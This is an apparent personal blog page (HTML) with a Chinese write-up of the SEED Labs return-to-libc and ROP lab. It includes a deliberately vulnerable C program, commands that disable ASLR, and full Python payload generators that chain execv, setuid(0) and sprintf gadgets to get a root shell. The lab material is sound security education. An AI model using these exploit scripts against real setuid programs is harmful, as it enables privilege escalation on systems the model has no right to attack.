@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境准备sudo sysctl -w kernel.randomize_va_space&#x3D;0sudo ln -sf &#x2F;bin&#x2F;zsh &#x2F;bin&#x2F;shgcc -m32 -z noexecstack -fno-stack-protector -o test test.c  被攻击程序#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Return-to-libc-and-ROP-Attack-Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/826ab436.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="环境准备sudo sysctl -w kernel.randomize_va_space&#x3D;0sudo ln -sf &#x2F;bin&#x2F;zsh &#x2F;bin&#x2F;shgcc -m32 -z noexecstack -fno-stack-protector -o test test.c  被攻击程序#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &amp;l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133828292.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221110215954795.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221110174906513.png">
+<meta property="article:published_time" content="2022-11-10T14:11:56.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.280Z">
+<meta property="article:author" content="ceyewan">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Return-to-libc-and-ROP-Attack-Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/245267c1.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/f9a30b6b.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/826ab436.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/826ab436.html&text=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/826ab436.html&is_video=false&description=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return-to-libc-and-ROP-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/826ab436.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/826ab436.html&name=Return-to-libc-and-ROP-Attack-Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/826ab436.html&t=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.</span> <span class="toc-text">被攻击程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Finding-out-the-Addresses-of-libc-Functions"><span class="toc-number">3.</span> <span class="toc-text">Task 1: Finding out the Addresses of libc Functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Putting-the-shell-string-in-the-memory"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Putting the shell string in the memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Launching-the-Attack"><span class="toc-number">5.</span> <span class="toc-text">Task 3: Launching the Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Defeat-Shell%E2%80%99s-countermeasure"><span class="toc-number">6.</span> <span class="toc-text">Task 4: Defeat Shell’s countermeasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Optional-Return-Oriented-Programming"><span class="toc-number">7.</span> <span class="toc-text">Task 5 (Optional): Return-Oriented Programming</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Return-to-libc-and-ROP-Attack-Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-10T14:11:56.000Z" class="dt-published" itemprop="datePublished">2022-11-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo ln -sf /bin/zsh /bin/sh</span><br><span class="line">gcc -m32 -z noexecstack -fno-stack-protector -o test test.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="被攻击程序"><a href="#被攻击程序" class="headerlink" title="被攻击程序"></a>被攻击程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy ebp into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));      </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* print out information for experiment purpose */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address of buffer[] inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer value inside bof():  0x%.8x\n&quot;</span>, (<span class="type">unsigned</span>)framep);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Function foo() is invoked %d times\n&quot;</span>, i++);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> input[<span class="number">1000</span>];</span><br><span class="line">   FILE *badfile;</span><br><span class="line"></span><br><span class="line">   badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">int</span> length = fread(input, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1000</span>, badfile);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Address of input[] inside main():  0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) input);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Input size: %d\n&quot;</span>, length);</span><br><span class="line"></span><br><span class="line">   bof(input);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;(^_^)(^_^) Returned Properly (^_^)(^_^)\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行 make 命令编译它。</p>
+<h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h2><p>使用 GDB 调试 retlic 程序，得到如下信息:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e0e360 &lt;system&gt;</span><br><span class="line">gdb-peda$ p exit</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00ec0 &lt;exit&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export MYSHELL=/bin/sh</span><br><span class="line">env | grep MYSHELL</span><br></pre></td></tr></table></figure>
+
+<p>写一个 help 函数，变出出来的可执行文件文件名应该和 retlic 一样长，输出 MYSHELL 的地址。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* shell = getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (shell)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)shell);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -o prtenv -m32 -g help.c                                   </span></span><br><span class="line"><span class="comment">// ./prtenv             </span></span><br><span class="line"><span class="comment">//     ffffdfe7</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p>我们先随便执行一下 retlic 程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Address of input[] inside main():  0xffffce00</span><br><span class="line">Input size: 300</span><br><span class="line">Address of buffer[] inside bof():  0xffffcdd0</span><br><span class="line">Frame Pointer value inside bof():  0xffffcde8</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 input 的地址和 buffer 的地址和 ebp 的值。并且可以算出 ebp 相对于 buffer 偏移了 24 字节。那么 ret 就是偏移 28 字节。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png" alt="image-20221108133512468"></p>
+<p>这样，我们用 system 的地址覆盖了 ret，在 bof 函数退出时就会去执行 system 函数，并且我们把参数放在环境变量中，然后找到了地址，传递给 system 函数，从而 system(“&#x2F;bin&#x2F;sh”) 会被执行。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133828292.png" alt="image-20221108133828292"></p>
+<p>可以看到，我们拿到了 root 权限。如果没有 exit 函数，会抛出异常。</p>
+<p>如果可执行程序的名字长度变化了，那么 sh_addr 也会相应变化。（名字长度变化会导致环境变量字符数变化，地址自然就会变化了）。</p>
+<h2 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h2><p>我们把 sh 恢复链接到 dash， sudo ln -sf &#x2F;bin&#x2F;dash &#x2F;bin&#x2F;sh。虽然 dash 和 bash 都有保护措施，但是我们可以使用 -p 参数关闭保护措施。为了使用多参数，这次我们使用 int execv(const char *pathname, char *const argv[]);，参数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pathname = address of &quot;/bin/bash&quot;</span><br><span class="line">argv[0] = address of &quot;/bin/bash&quot;</span><br><span class="line">argv[1] = address of &quot;-p&quot;</span><br><span class="line">argv[2] = NULL (i.e., 4 bytes of zero）</span><br></pre></td></tr></table></figure>
+
+<p>同样，使用 GDB 调试一下，得到 execv 和 exit 的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p execv</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e95410 &lt;execv&gt;</span><br><span class="line">gdb-peda$ p exit</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00ec0 &lt;exit&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数 pathname 我们可以使用环境变量，那么参数 argv 呢，其中含有 “\0” 不太好操作，我们把它存在 badfile 中传入可执行程序。在 input 函数中有。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>))</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0xffffdfec</span></span><br><span class="line"></span><br><span class="line">X = <span class="number">36</span></span><br><span class="line">shell_addr = <span class="number">0xffffdfdd</span>       <span class="comment"># The address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[X:X+<span class="number">4</span>] = (shell_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">A = <span class="number">40</span></span><br><span class="line">argv_addr = <span class="number">0xffffce00</span> + <span class="number">288</span>  <span class="comment"># The address of argv = input_addr + 288</span></span><br><span class="line">content[A:A+<span class="number">4</span>] = (argv_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Y = <span class="number">28</span></span><br><span class="line">execv_addr = <span class="number">0xf7e95410</span>   <span class="comment"># The address of execv()</span></span><br><span class="line">content[Y:Y+<span class="number">4</span>] = (execv_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Z = <span class="number">32</span></span><br><span class="line">exit_addr = <span class="number">0xf7e00ec0</span>     <span class="comment"># The address of exit()</span></span><br><span class="line">content[Z:Z+<span class="number">4</span>] = (exit_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">288</span>:<span class="number">292</span>] = (shell_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line">content[<span class="number">292</span>:<span class="number">296</span>] = (flag_addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line">content[<span class="number">296</span>:<span class="number">300</span>] = (<span class="number">0x00000000</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221110215954795.png" alt="image-20221110215954795"></p>
+<h2 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h2><p>思路我另一篇关于 ROP 的文章里写的比较清楚了。这里分别用 system(“&#x2F;bin&#x2F;sh”) 和 execv(“&#x2F;bin&#x2F;sh”) 解决了问题。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">foo_addr = <span class="number">0x565562b0</span></span><br><span class="line">execv_addr = <span class="number">0xf7e95410</span></span><br><span class="line">exit_addr = <span class="number">0xf7e00ec0</span></span><br><span class="line">sprintf_addr = <span class="number">0xf7e1cd90</span></span><br><span class="line">leaveret_addr = <span class="number">0x565562ed</span>  <span class="comment"># disassemble bof</span></span><br><span class="line">setuid_addr = <span class="number">0xf7e95d90</span></span><br><span class="line">shell_addr = <span class="number">0xffffdfdd</span>  <span class="comment"># help() function</span></span><br><span class="line">flag_addr = <span class="number">0xffffdfec</span></span><br><span class="line">system_addr = <span class="number">0xf7e0e360</span></span><br><span class="line">ebp_addr = <span class="number">0xffffcde8</span></span><br><span class="line">input_addr = <span class="number">0xffffce00</span></span><br><span class="line">ebp_next = ebp_addr</span><br><span class="line"></span><br><span class="line">sprintfarg_addr1 = ebp_addr + <span class="number">0x130</span> + <span class="number">12</span></span><br><span class="line">sprintfarg_addr2 = shell_addr + <span class="built_in">len</span>(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">argv_addr = input_addr + <span class="number">0x170</span> + <span class="number">8</span> + <span class="number">24</span>  <span class="comment"># 因为 strcpy 无法拷贝 0，所以我们从 input 那里拿</span></span><br><span class="line"></span><br><span class="line">ebp_next += <span class="number">0x10</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(leaveret_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> - <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 foo 函数 10 次</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    ebp_next += <span class="number">0x10</span></span><br><span class="line">    content += tobytes(ebp_next)</span><br><span class="line">    content += tobytes(foo_addr)</span><br><span class="line">    content += tobytes(leaveret_addr)</span><br><span class="line">    content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> - <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 sprintf 函数生成 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ebp_next += <span class="number">0x20</span></span><br><span class="line">    content += tobytes(ebp_next)</span><br><span class="line">    content += tobytes(sprintf_addr)</span><br><span class="line">    content += tobytes(leaveret_addr)</span><br><span class="line">    content += tobytes(sprintfarg_addr1)</span><br><span class="line">    content += tobytes(sprintfarg_addr2)</span><br><span class="line">    content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">20</span>)</span><br><span class="line">    sprintfarg_addr1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 steuid(0) 函数把权限设为 root</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(setuid_addr)</span><br><span class="line">content += tobytes(leaveret_addr)</span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 调用 system 函数得到 shell</span></span><br><span class="line"><span class="comment"># ebp_next += 0x20</span></span><br><span class="line"><span class="comment"># content += tobytes(ebp_next)</span></span><br><span class="line"><span class="comment"># content += tobytes(system_addr)</span></span><br><span class="line"><span class="comment"># content += tobytes(leaveret_addr)</span></span><br><span class="line"><span class="comment"># content += tobytes(shell_addr)</span></span><br><span class="line"><span class="comment"># content += b&#x27;A&#x27; * (0x20 - 16)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 execv 函数得到 shell</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(execv_addr)</span><br><span class="line">content += tobytes(leaveret_addr)</span><br><span class="line">content += tobytes(shell_addr)</span><br><span class="line">content += tobytes(argv_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> - <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 exit 函数，退出进程</span></span><br><span class="line">content += tobytes(<span class="number">0xffffffff</span>)</span><br><span class="line">content += tobytes(exit_addr)</span><br><span class="line"></span><br><span class="line">content += tobytes(shell_addr)</span><br><span class="line">content += tobytes(flag_addr)</span><br><span class="line">content += tobytes(<span class="number">0x00000000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221110174906513.png" alt="image-20221110174906513"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E6%94%BB%E5%87%BB%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.</span> <span class="toc-text">被攻击程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Finding-out-the-Addresses-of-libc-Functions"><span class="toc-number">3.</span> <span class="toc-text">Task 1: Finding out the Addresses of libc Functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Putting-the-shell-string-in-the-memory"><span class="toc-number">4.</span> <span class="toc-text">Task 2: Putting the shell string in the memory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Launching-the-Attack"><span class="toc-number">5.</span> <span class="toc-text">Task 3: Launching the Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Defeat-Shell%E2%80%99s-countermeasure"><span class="toc-number">6.</span> <span class="toc-text">Task 4: Defeat Shell’s countermeasure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Optional-Return-Oriented-Programming"><span class="toc-number">7.</span> <span class="toc-text">Task 5 (Optional): Return-Oriented Programming</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
